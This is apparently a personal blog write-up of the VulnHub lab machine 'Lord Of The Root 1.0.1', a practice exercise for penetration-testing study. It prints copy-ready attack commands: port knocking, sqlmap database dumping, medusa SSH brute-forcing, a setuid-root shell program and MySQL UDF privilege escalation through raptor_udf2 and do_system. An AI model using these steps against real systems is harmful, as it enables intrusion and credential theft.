---
layout: post
title: 'Lord Of The Root: 1.0.1 write-up'
tags:
- challenges
- hack
- hacking
- kooksec
- lord of root
- lotr
- vulnhub
---
So this is the first write-up of lord of the root 1.0.1 created by this guy 
#KookSec.

This is apparently on the level of oscp certificate which i plan on taking so lets see...

After setting it up on vmware and running this lotr server we start up kali and begin the process.....

after a quick search of my LAN to find the target's ip we find that the ip is 192.168.124.138 btw i am 192.168.124.134.

So lets start by scanning the target machine for open ports and stuff>root@kali:~# nmap 192.168.124.138 -sT -p- -A
Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:52 EDT
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.69% done
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 3.67% done; ETC: 18:55 (0:03:04 remaining)
Nmap scan report for 192.168.124.138 (192.168.124.138)
Host is up (0.0011s latency).
Not shown: 65534 filtered ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
| 2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|_ 256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
MAC Address: 00:0C:29:8F:4B:CE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14, Linux 3.18, Linux 3.2 - 3.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE
HOP RTT ADDRESS
1 1.07 ms 192.168.124.138 (192.168.124.138)

We can see that the port 22(ssh) is on so lets try to connect and see what we can get from it


[![Untitled](https://trickster0.files.wordpress.com/2015/10/untitled.png)](https://trickster0.files.wordpress.com/2015/10/untitled.png)

It says that it wants us to knock :P and it is easy as 1,2,3 so i am guessing i should knock on port 1,2,3

i used this script to knock

more

>#!/bin/sh
HOST=$1
shift
for ARG in "$@" ; do
nmap -PN --host_timeout 201 --max-retries 0 -p $ARG $HOST
done

now lets run it

>root@kali:~/Desktop# ./knock.sh 192.168.124.138 1 2 3

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDT
Warning: 192.168.124.138 giving up on port because retransmission cap hit (0).
Nmap scan report for 192.168.124.138 (192.168.124.138)
Host is up (0.00021s latency).
PORT STATE SERVICE
1/tcp filtered tcpmux
MAC Address: 00:0C:29:8F:4B:CE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDT
Warning: 192.168.124.138 giving up on port because retransmission cap hit (0).
Nmap scan report for 192.168.124.138 (192.168.124.138)
Host is up (0.00026s latency).
PORT STATE SERVICE
2/tcp filtered compressnet
MAC Address: 00:0C:29:8F:4B:CE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDT
Warning: 192.168.124.138 giving up on port because retransmission cap hit (0).
Nmap scan report for 192.168.124.138 (192.168.124.138)
Host is up (0.00027s latency).
PORT STATE SERVICE
3/tcp filtered compressnet
MAC Address: 00:0C:29:8F:4B:CE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

now lets scan once more to see if any new port has opened and a goodie server is running somewhere

>root@kali:~/Desktop# nmap 192.168.124.138 -sT -p- -A

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDT
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 3.80% done; ETC: 19:00 (0:03:23 remaining)
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 7.43% done; ETC: 19:00 (0:02:42 remaining)
Nmap scan report for 192.168.124.138 (192.168.124.138)
Host is up (0.0015s latency).
Not shown: 65533 filtered ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
| 2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|_ 256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
1337/tcp open http Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:8F:4B:CE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14, Linux 3.18, Linux 3.2 - 3.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT ADDRESS
1 1.49 ms 192.168.124.138 (192.168.124.138)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.60 seconds

we can see that the leet(1337) port is open :P and there is an apache http server running so lets see the website

[![http](https://trickster0.files.wordpress.com/2015/10/http.png)](https://trickster0.files.wordpress.com/2015/10/http.png)

so pretty much nothing on source code of the website either so lets test the robots.txt for any usefull info

[![robots](https://trickster0.files.wordpress.com/2015/10/robots.png)](https://trickster0.files.wordpress.com/2015/10/robots.png)

we cant go from here??? well i can totally see something in the source page!!!!

>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh

and it looks like base64 so lets try to decode it
and after decoding it we get this

>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!

i am guessing we are closer so lets decode the rest of this nonsense

>/978345210/index.php

W8 WHAT???? a secret folder??? awesome :D lets try it

[![gates](https://trickster0.files.wordpress.com/2015/10/gates.png)](https://trickster0.files.wordpress.com/2015/10/gates.png)

apparently we reached the gates of mordor which was much easier than the movie...

after testing a few sql queries i didnt have much success so i thought to fire up sqlmap and watch some magic happens with hopefully some of the parameters...

>root@kali:~/Desktop# sqlmap -o -u "http://192.168.124.138:1337/978345210/index.php" --forms --dbs

and we get the databases oh yeah!

[![gate](https://trickster0.files.wordpress.com/2015/10/gate.png)](https://trickster0.files.wordpress.com/2015/10/gate.png)

now lets get the tables for the webapp db

>root@kali:~/Desktop# sqlmap -o -u "http://192.168.124.138:1337/978345210/index.php" --forms -D Webapp --tables

We can see a nice table called Users so lets see the columns of it :D

>root@kali:~/Desktop# sqlmap -o -u "http://192.168.124.138:1337/978345210/index.php" --forms -D Webapp -T Users --columns

so we saw some interesting columns but lets choose the best of them...lets get the dumps now :D

>root@kali:~/Desktop# sqlmap -o -u "http://192.168.124.138:1337/978345210/index.php" --forms -D Webapp -T Users -C id,username,password --dump


[![d](https://trickster0.files.wordpress.com/2015/10/d.png)](https://trickster0.files.wordpress.com/2015/10/d.png)

but wait we havent finished yet!! we should check the mysql db too!!!
running our sqlmap agains for the specifics tables and columns we get these dumps :D

>root@kali:~/Desktop# sqlmap -o -u "http://192.168.124.138:1337/978345210/index.php" --forms -D mysql --tables
root@kali:~/Desktop# sqlmap -o -u "http://192.168.124.138:1337/978345210/index.php" --forms -D mysql -T User --columns
root@kali:~/Desktop# sqlmap -o -u "http://192.168.124.138:1337/978345210/index.php" --forms -D mysql -T user -C User,Password --dump


[![u](https://trickster0.files.wordpress.com/2015/10/u.png)](https://trickster0.files.wordpress.com/2015/10/u.png)

checking the hash for debian didnt work out but it for the root one because after checking it on crackstation we got that the password for this hash is actually 
**darkshadow**

after logging in with the credentials we got already on the gates of mordor i got trolled with this :/

[![lotr](https://trickster0.files.wordpress.com/2015/10/lotr.png)](https://trickster0.files.wordpress.com/2015/10/lotr.png)

but after this i thought hey lets try to login on ssh so i crafted real quick a list of users and another list with passwords from the dumps we got and run my favourite medusa

>medusa -h 192.168.124.138 -U user -P pass -M ssh


[![m](https://trickster0.files.wordpress.com/2015/10/m.png)](https://trickster0.files.wordpress.com/2015/10/m.png)

OH YEAH! we got it lets connect on ssh now

[![p](https://trickster0.files.wordpress.com/2015/10/p.png)](https://trickster0.files.wordpress.com/2015/10/p.png)

So now after checking around i noticed a folder called SECRET so i checked and saw 3 doors and by 3 doors i mean 3 folders name door1 door2 door3

[![a](https://trickster0.files.wordpress.com/2015/10/a.png)](https://trickster0.files.wordpress.com/2015/10/a.png)
i checked and run all the file files on each door and they needed input not to add that they were running as root so i though buffer overflowing time so i checked to see if ASLR was on

>cat /proc/sys/kernel/randomize__va_space
2

too bad :/ i tried some fuzzing anyway

[![seg](https://trickster0.files.wordpress.com/2015/10/seg.png)](https://trickster0.files.wordpress.com/2015/10/seg.png)

BOOM SEGFAULT! after a while i tried inputting but it didnt work although it worked on another door so i figured someone is switching the damn files! ofc i copied the right one on the /tmp folder and checked it for a while but i wasnt feeling like doing buffer overflow so i remembered that i had a username=root and a password=darkshadow so i ran

>ps aux | grep mysql

and it was running as root so...awesomeness since a while back i read an article about a method for privelege escalation through mysql! here it is --> 
[link](http://infamoussyn.com/page/3/)
although there is already in kali something similar in this path /usr/share/sqlmap/udf/mysql/linux/32/lib_mysqludf_sys.so_
anyways, so i created a C script in the /tmp folder to give me 0 UID priv on bash so we can do some stuff 
i called it set.c

>cat set.c


>#include 
#include 
#include 
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash")
}

and then i compiled it

>gcc set.c -o set
chmod 755 set

so we are ready and good to go after we will download the script raptor_udf2.c
and follow the script's commands

>gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

there was a mistake in the code comments that we should use -w1 although it should be wl..
and so i logged in

>mysql -uroot -p


>mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('ls /root/ > /tmp/set; chmod 777 /tmp/set');
mysql> \! cat /tmp/out
mysql> select do_system('cat /root/Flag.txt > /tmp/set; chmod 777 /tmp/set');
mysql> \! cat /tmp/out

after all that i managed to get this

[![pr](https://trickster0.files.wordpress.com/2015/10/pr.png)](https://trickster0.files.wordpress.com/2015/10/pr.png)
BOOM WE GOT THE FLAG!!!
but as u can see i saw some interesting files in the root directory!!!! so lets see the bonus!! first of all that damn switcher.py!!

[![sw](https://trickster0.files.wordpress.com/2015/10/sw.png)](https://trickster0.files.wordpress.com/2015/10/sw.png)
there it is...
lets see the buf.c and the other.c file

[![buf](https://trickster0.files.wordpress.com/2015/10/buf.png)](https://trickster0.files.wordpress.com/2015/10/buf.png)
buf.c which was vulnerable cause hello...

>strcpy(buff, argv[1]);


[![fine](https://trickster0.files.wordpress.com/2015/10/fine.png)](https://trickster0.files.wordpress.com/2015/10/fine.png)
the other.c was fine...

so that is it thx a lot for this great challenge and for a good practise on my endless journey to hacking. thx a lot kooksec and thx vulnhub for hosting those great challenges they really teach us a lot!
